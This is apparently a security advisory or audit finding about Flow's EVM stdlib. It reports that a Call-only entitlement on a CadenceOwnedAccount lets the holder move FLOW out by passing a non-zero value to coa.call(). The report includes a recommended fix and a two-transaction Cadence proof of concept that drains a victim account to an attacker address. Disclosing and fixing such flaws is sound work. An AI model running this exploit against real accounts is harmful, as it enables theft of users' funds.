### Title
`Call` Entitlement Permits Arbitrary FLOW Transfer Out of Victim COA via Non-Zero `value` in `coa.call()` — (`fvm/evm/stdlib/contract.cdc`, `fvm/evm/handler/handler.go`)

---

### Summary

The `CadenceOwnedAccount.call()` function is gated with `access(Owner | Call)`, meaning the `Call` entitlement alone is sufficient to invoke it. The function accepts an unrestricted `value: Balance` parameter. There is no guard preventing a `Call`-only holder from passing a non-zero balance, which causes FLOW to be transferred from the victim COA's EVM balance to an arbitrary EVM address. This bypasses the `access(Owner | Withdraw)` guard on `withdraw()`, which was the intended gate for FLOW egress from a COA.

---

### Finding Description

The `CadenceOwnedAccount` resource in `contract.cdc` defines two distinct entitlement-gated paths for moving FLOW out of a COA:

**`withdraw` — requires `Owner | Withdraw`:** [1](#0-0) 

**`call` — requires only `Owner | Call`, yet accepts an arbitrary `value: Balance`:** [2](#0-1) 

There is no `pre` condition on `call` that enforces `value.isZero()` or that escalates the required entitlement when `value > 0`. The `value` is passed directly to `InternalEVM.call` as `value.attoflow` with no further restriction.

At the Go layer, `newInternalEVMTypeCallFunction` in `impl.go` unconditionally sets `isAuthorized = true` before constructing the account: [3](#0-2) 

`executeAndHandleAuthorizedCall` in `handler.go` only checks `a.isAuthorized` — it performs no value-specific authorization: [4](#0-3) 

The `Account.Call` method in `handler.go` passes the balance through to `NewContractCall` without any guard: [5](#0-4) 

---

### Impact Explanation

An attacker who holds a capability with only the `Call` entitlement on a victim's COA can drain the COA's entire EVM FLOW balance by calling:

```cadence
coa.call(
    to: attackerEVMAddress,
    data: [],
    gasLimit: 21000,
    value: EVM.Balance(attoflow: <victim_balance>)
)
```

This moves FLOW from the victim COA's EVM account to the attacker's EVM address. The attacker can then call `withdraw` on their own COA (which they fully own) to recover the FLOW as a Cadence `FlowToken.Vault`. The total supply is unaffected (no mint/burn), but the victim loses their FLOW. This is unauthorized asset transfer — a Critical impact under the stated scope.

---

### Likelihood Explanation

The `Call` entitlement is the natural entitlement to publish for dApps or protocols that need to invoke smart contracts on behalf of a COA (e.g., DeFi integrations, automation). A victim who publishes a `Call`-only capability believing it is safe (since `Withdraw` is a separate entitlement) is fully exploitable. The exploit requires no privileged node access, no key compromise, and no brute force — only a valid `auth(EVM.Call) &EVM.CadenceOwnedAccount` capability reference.

---

### Recommendation

Add a `pre` condition to `call` (and `callWithSigAndArgs`, `deploy`) that requires `Owner | Withdraw` entitlement when `value > 0`, or alternatively restrict `call` to `access(Owner | Call | Withdraw)` when value is non-zero. The simplest safe fix is a Cadence-level guard:

```cadence
access(Owner | Call)
fun call(to: EVMAddress, data: [UInt8], gasLimit: UInt64, value: Balance): Result {
    pre {
        !EVM.isPaused(): "EVM operations are temporarily paused"
        // Prevent Call-only holders from transferring FLOW
        value.isZero() || self.isOwnerOrWithdraw(): "transferring value requires Owner or Withdraw entitlement"
    }
    ...
}
```

Alternatively, split the function into a value-bearing variant gated on `Owner | Withdraw` and a zero-value variant gated on `Owner | Call`.

---

### Proof of Concept

```cadence
import EVM from <EVMContractAddress>
import FlowToken from <FlowTokenAddress>

// Step 1: Victim setup — publish a Call-only capability
transaction {
    prepare(victim: auth(Storage, Capabilities) &Account) {
        let coa <- EVM.createCadenceOwnedAccount()
        // Fund the COA with 10 FLOW
        let vault <- FlowToken.createEmptyVault(...)
        // ... mint/deposit 10 FLOW into vault, then:
        coa.deposit(from: <-vault)
        victim.storage.save(<-coa, to: /storage/victimCOA)
        // Publish capability with ONLY Call entitlement
        let cap = victim.capabilities.storage.issue<auth(EVM.Call) &EVM.CadenceOwnedAccount>(
            /storage/victimCOA
        )
        victim.capabilities.publish(cap, at: /public/victimCOACall)
    }
}

// Step 2: Attacker exploits the Call-only capability
transaction {
    prepare(attacker: auth(Storage) &Account) {
        let victimCOA = getAccount(<victimAddress>)
            .capabilities.borrow<auth(EVM.Call) &EVM.CadenceOwnedAccount>(
                /public/victimCOACall
            )!

        // Transfer 10 FLOW from victim COA to attacker's EVM address
        let bal = EVM.Balance(attoflow: 10_000_000_000_000_000_000) // 10 FLOW
        let res = victimCOA.call(
            to: EVM.EVMAddress(bytes: <attackerEVMAddressBytes>),
            data: [],
            gasLimit: 21_000,
            value: bal
        )
        assert(res.status == EVM.Status.successful, message: "exploit failed")
        // Victim COA EVM balance is now 0; attacker EVM address holds 10 FLOW
    }
}
```

The victim COA's EVM balance decreases by 10 FLOW and the attacker's EVM address balance increases by 10 FLOW, confirmed by `EVM.EVMAddress(...).balance().inFLOW()` before and after.

func (a *Account) Call(to types.Address, data types.Data, gaslimit types.GasLimit, balance types.Balance) *types.ResultSummary {
